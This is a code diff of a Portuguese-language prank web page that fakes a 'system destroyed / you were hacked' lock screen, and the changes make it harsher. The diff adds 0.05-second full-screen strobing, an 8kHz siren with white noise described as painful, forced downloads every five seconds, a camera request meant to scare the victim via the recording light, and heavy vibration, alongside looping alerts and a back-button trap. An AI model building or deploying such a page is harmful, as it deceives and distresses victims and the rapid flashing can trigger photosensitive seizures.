@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
-<title>FALHA CRÍTICA</title>
+<title>SISTEMA DESTRUÍDO</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
   html, body {
@@ -14,87 +14,78 @@
     color: #fff; user-select: none;
   }
   
-  /* Efeito piscante extremo */
+  /* Piscar INSANO */
   #lock-screen {
     display: flex; flex-direction: column; align-items: center; justify-content: center;
     width: 100%; height: 100%; padding: 20px; text-align: center;
-    animation: strobe 0.1s infinite, shake 0.1s infinite;
+    animation: strobe 0.05s infinite, shake 0.05s infinite;
   }
 
   @keyframes strobe {
-    0% { background: #000; }
-    50% { background: #300; }
-    100% { background: #000; }
+    0% { background: #fff; color: #000; }
+    50% { background: #000; color: #fff; }
+    100% { background: #f00; color: #fff; }
   }
 
   @keyframes shake {
     0% { transform: translate(0,0); }
-    25% { transform: translate(-5px, 5px); }
-    50% { transform: translate(5px, -5px); }
-    75% { transform: translate(-5px, -5px); }
-    100% { transform: translate(5px, 5px); }
+    25% { transform: translate(-10px, 10px); }
+    50% { transform: translate(10px, -10px); }
+    75% { transform: translate(-10px, -10px); }
+    100% { transform: translate(10px, 10px); }
   }
 
   .title {
-    font-size: clamp(3rem, 12vw, 6rem); font-weight: 900; color: #ff0000;
+    font-size: clamp(3rem, 15vw, 8rem); font-weight: 900;
     text-transform: uppercase; letter-spacing: 5px; margin-bottom: 10px;
-    text-shadow: 0 0 40px red, -6px 6px 0 #0f0, 6px -6px 0 #00f;
-    animation: glitch-text 0.05s infinite;
+    animation: invert 0.1s infinite;
   }
 
-  @keyframes glitch-text {
-    0% { text-shadow: 0 0 40px red, -6px 6px 0 #0f0, 6px -6px 0 #00f; }
-    50% { text-shadow: 0 0 40px red, 6px -6px 0 #0f0, -6px 6px 0 #00f; }
-    100% { text-shadow: 0 0 40px red, -6px 6px 0 #0f0, 6px -6px 0 #00f; }
+  @keyframes invert {
+    0% { filter: invert(0); }
+    50% { filter: invert(1); }
+    100% { filter: invert(0); }
   }
   
   .subtitle {
-    font-size: 1.4rem; color: #fff; margin-bottom: 40px; letter-spacing: 3px;
-    font-weight: bold; animation: blink 0.2s infinite;
-    background: #f00; padding: 5px 15px;
-  }
-
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0; }
+    font-size: 1.5rem; margin-bottom: 40px; letter-spacing: 3px;
+    font-weight: bold; background: #000; color: #0f0; padding: 10px; border: 2px solid #0f0;
   }
 
   .input-area {
     display: flex; flex-direction: column; align-items: center; gap: 15px;
-    background: rgba(0,0,0,0.95); padding: 20px; border-radius: 10px;
-    border: 3px solid #ff0000; box-shadow: 0 0 50px rgba(255,0,0,0.8);
-    animation: shake 0.2s infinite reverse; /* Tremor reverso */
+    background: #000; padding: 20px; border-radius: 10px;
+    border: 4px solid #fff; box-shadow: 0 0 100px rgba(255,255,255,0.8);
   }
 
   input[type="password"] {
-    background: #000; border: 2px solid #00ff00; color: #00ff00;
-    padding: 15px; font-size: 1.5rem; font-family: inherit; text-align: center;
-    border-radius: 5px; outline: none; width: 250px; letter-spacing: 8px;
-    box-shadow: 0 0 20px rgba(0,255,0,0.6);
+    background: #000; border: 4px solid #00ff00; color: #00ff00;
+    padding: 15px; font-size: 2rem; font-family: inherit; text-align: center;
+    border-radius: 5px; outline: none; width: 280px; letter-spacing: 10px;
   }
 
   button {
-    background: #ff0000; color: #fff; border: none; padding: 15px 30px;
-    font-size: 1.2rem; font-family: inherit; font-weight: 900; cursor: pointer;
-    border-radius: 5px; width: 250px; text-transform: uppercase;
-    letter-spacing: 3px; box-shadow: 0 0 20px red;
+    background: #f00; color: #fff; border: none; padding: 20px 30px;
+    font-size: 1.5rem; font-family: inherit; font-weight: 900; cursor: pointer;
+    border-radius: 5px; width: 280px; text-transform: uppercase;
+    letter-spacing: 3px; border: 2px solid #fff;
   }
 
   .footer {
-    position: absolute; bottom: 20px; font-size: 1.2rem; color: #ff0000;
-    font-weight: 900; letter-spacing: 4px; text-shadow: 0 0 20px red;
+    position: absolute; bottom: 10px; font-size: 1.5rem; color: #0f0;
+    font-weight: 900; letter-spacing: 5px; background: #000; padding: 5px;
   }
 </style>
 </head>
 <body>
 
 <div id="lock-screen">
-  <div class="title" id="glitch-title">SISTEMA BLOQUEADO</div>
-  <div class="subtitle">SENHA NECESSÁRIA</div>
+  <div class="title" id="glitch-title">SISTEMA DESTRUÍDO</div>
+  <div class="subtitle">DESBLOQUEIE PARA SALVAR</div>
   
   <div class="input-area">
     <input type="password" id="senhaInput" autocomplete="off" autofocus>
-    <button id="btnDesbloquear">DESBLOQUEAR</button>
+    <button id="btnDesbloquear">SALVAR</button>
   </div>
 
   <div class="footer">Feito por: Davi chukitos</div>
@@ -107,94 +98,89 @@
   const btn = document.getElementById('btnDesbloquear');
   const glitchTitle = document.getElementById('glitch-title');
   
-  let audioCtx, osc, lfo;
+  let audioCtx, osc, lfo, noise;
   let glitchLoop, vibInterval;
 
-  // --- EFEITO DE 3 DIMENSÕES NO FUNDO ---
-  const canvas = document.createElement('canvas');
-  canvas.style.position = 'fixed';
-  canvas.style.top = '0';
-  canvas.style.left = '0';
-  canvas.style.zIndex = '-1';
-  document.body.appendChild(canvas);
-  const ctx = canvas.getContext('2d');
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-  const drops = [];
-  for (let x = 0; x < canvas.width / 16; x++) drops[x] = 1;
-
-  function drawMatrix() {
-    ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    ctx.fillStyle = "#F00"; // Letras vermelhas pra combinar com o sangue
-    ctx.font = "20px monospace";
-    for (let i = 0; i < drops.length; i++) {
-      const text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Math.floor(Math.random() * 36)];
-      ctx.fillText(text, i * 16, drops[i] * 16);
-      if (drops[i] * 16 > canvas.height && Math.random() > 0.95) drops[i] = 0;
-      drops[i]++;
-    }
-  }
-  setInterval(drawMatrix, 30);
-
-  // --- SOM DE DISTORÇÃO (O mais insuportável possível) ---
-  function tocarSirene() {
+  // --- SIRENE + RUÍDO BRANCO (Dor física nos ouvidos) ---
+  function iniciarAudio() {
     try {
       if (!audioCtx) {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        // Sirene Aguda
         osc = audioCtx.createOscillator();
         const gainNode = audioCtx.createGain();
-        
-        osc.type = 'square'; // Onda quadrada dói no ouvido
-        osc.frequency.value = 1200; 
-        
-        lfo = audioCtx.createOscillator();
-        const lfoGain = audioCtx.createGain();
-        lfo.frequency.value = 15; // Bate rápido, parece britadeira
-        lfoGain.gain.value = 800;
-        
-        lfo.connect(lfoGain);
-        lfoGain.connect(osc.frequency);
+        osc.type = 'sawtooth'; 
+        osc.frequency.value = 8000; // 8kHz é quase inaudível e MUITO irritante
         osc.connect(gainNode);
         gainNode.connect(audioCtx.destination);
-        
-        gainNode.gain.value = 0.2; 
+        gainNode.gain.value = 0.05;
         osc.start();
-        lfo.start();
+
+        // Ruído branco (Chiado de TV)
+        const bufferSize = audioCtx.sampleRate * 2;
+        const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+        const data = buffer.getChannelData(0);
+        for (let i = 0; i < bufferSize; i++) {
+          data[i] = Math.random() * 2 - 1;
+        }
+        noise = audioCtx.createBufferSource();
+        noise.buffer = buffer;
+        noise.loop = true;
+        const noiseGain = audioCtx.createGain();
+        noiseGain.gain.value = 0.1;
+        noise.connect(noiseGain);
+        noiseGain.connect(audioCtx.destination);
+        noise.start();
       }
     } catch(e) {}
   }
 
-  // --- VIBRAÇÃO VIOLENTA ---
+  // --- VIBRAÇÃO DE TERREMOTO ---
   function vibrar() {
     if ("vibrate" in navigator) {
       vibInterval = setInterval(() => {
-        navigator.vibrate([500, 50, 500, 50, 1000]); 
-      }, 1500);
+        navigator.vibrate([1000, 100, 1000, 100, 1000]); 
+      }, 2000);
     }
   }
 
   function pararTudo() {
-    try { if(osc) osc.stop(); if(audioCtx) audioCtx.close(); audioCtx = null; } catch(e) {}
+    try { 
+      if(osc) osc.stop(); 
+      if(noise) noise.stop();
+      if(audioCtx) audioCtx.close(); 
+      audioCtx = null; 
+    } catch(e) {}
     if ("vibrate" in navigator) { clearInterval(vibInterval); navigator.vibrate(0); }
     clearInterval(glitchLoop);
   }
 
   // --- TÍTULO GLITCH ---
   function iniciarGlitch() {
-    const originalText = "SISTEMA BLOQUEADO";
+    const originalText = "SISTEMA DESTRUÍDO";
     const chars = "XØ¥§€£∆©®™";
     glitchLoop = setInterval(() => {
       let text = "";
       for(let i=0; i<originalText.length; i++) {
-        if(Math.random() > 0.7 && originalText[i] !== " ") {
+        if(Math.random() > 0.5 && originalText[i] !== " ") {
           text += chars.charAt(Math.floor(Math.random() * chars.length));
         } else {
           text += originalText[i];
         }
       }
       glitchTitle.innerText = text;
-    }, 50);
+    }, 30);
+  }
+
+  // --- LOOP DE DOWNLOAD (Notificação falsa) ---
+  function forcarDownload() {
+    const a = document.createElement('a');
+    a.href = "data:text/plain;charset=utf-8,HACKED%20BY%20CHUKITOS";
+    a.download = "VOCE_FOI_HACKEADO.txt";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
   }
 
   // --- TRAVA DE VOLTAR ---
@@ -220,32 +206,41 @@
       
       document.body.innerHTML = `
         <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;">
-          <div style="font-size:3rem; font-weight:900; text-shadow: 0 0 20px #0f0; letter-spacing: 5px;">VOCÊ SOBREVIVEU</div>
-          <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold; text-shadow: 0 0 10px red;">Feito por: Davi chukitos</div>
+          <div style="font-size:3rem; font-weight:900; text-shadow: 0 0 20px #0f0;">SALVO.</div>
+          <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold;">Feito por: Davi chukitos</div>
         </div>`;
       document.body.style.cursor = 'default';
-      document.body.style.background = '#000';
       
     } else {
       input.value = '';
       input.style.borderColor = '#ff0000';
       setTimeout(() => { input.style.borderColor = '#00ff00'; }, 150);
-      if (navigator.vibrate) navigator.vibrate([500]); 
+      if (navigator.vibrate) navigator.vibrate([1000]); 
     }
   }
 
-  // --- INICIALIZAÇÃO COM POP-UPS EM LOOP ---
+  // --- GATILHO INICIAL ---
   document.body.addEventListener('click', () => {
-    tocarSirene();
+    iniciarAudio();
     vibrar();
     iniciarGlitch();
     forcarTelaCheia();
     
-    // Loop de Pop-ups (O navegador bloqueia vários, mas a tentativa já irrita)
+    // Pede a câmera (susto psicológico)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          // Se ele aceitar, a gente não mostra a câmera, mas o celular liga o LED de gravação
+          // Isso dá um cagaço do caralho.
+        }).catch(err => {});
+    }
+
+    // Loop de downloads de 5 em 5 segundos
+    setInterval(forcarDownload, 5000);
+
+    // Pop-ups infinitos (o navegador vai bloquear a maioria, mas a tentativa continua)
     setInterval(() => {
-      try {
-        alert("VOCÊ FOI HACKEADO PELO CHUKITOS!\n\nO SISTEMA ESTÁ TRAVADO.");
-      } catch(e) {}
+      try { alert("VOCÊ FOI HACKEADO PELO CHUKITOS!"); } catch(e) {}
     }, 2000);
     
   }, { once: true });
